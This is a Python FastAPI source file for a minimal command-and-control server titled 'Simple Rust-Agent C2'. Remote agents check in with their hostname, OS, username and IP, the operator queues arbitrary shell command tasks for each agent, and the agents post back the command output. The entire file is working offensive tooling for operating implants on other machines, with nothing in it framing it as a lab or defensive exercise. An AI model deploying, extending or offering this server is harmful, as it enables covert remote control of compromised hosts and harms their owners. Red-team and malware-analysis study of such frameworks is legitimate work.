from fastapi import FastAPI, HTTPException
from pydantic import BaseModel
from typing import Dict, Optional, Any
import uvicorn

app = FastAPI(title="Simple Rust-Agent C2")

# In-memory storage (use SQLite/redis for real project)
agents: Dict[str, Dict[str, Any]] = {}           # agent_id → {"last_seen": time, "info": ..., "tasks": [], "results": {}}
tasks_queue: Dict[str, list] = {}                # agent_id → list of pending tasks
results: Dict[str, Dict] = {}                    # task_id → result

class Checkin(BaseModel):
    id: str
    hostname: str
    os: str
    username: str
    ip: str

class Task(BaseModel):
    id: str
    command: str

class Result(BaseModel):
    agent_id: str
    task_id: str
    output: str

@app.post("/checkin")
async def agent_checkin(data: Checkin):
    agent_id = data.id
    agents[agent_id] = {
        "info": data.dict(),
        "last_seen": 0,  # add time.time()
        "tasks": tasks_queue.get(agent_id, []),
    }
    # Return pending task if any (or null)
    if agent_id in tasks_queue and tasks_queue[agent_id]:
        task = tasks_queue[agent_id].pop(0)
        return task
    return None

@app.post("/result")
async def submit_result(res: Result):
    results[res.task_id] = res.dict()
    return {"status": "ok"}

@app.post("/task/{agent_id}")
async def queue_task(agent_id: str, task: Task):
    if agent_id not in tasks_queue:
        tasks_queue[agent_id] = []
    tasks_queue[agent_id].append(task.dict())
    return {"status": "queued"}

@app.get("/agents")
async def list_agents():
    return agents

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000)
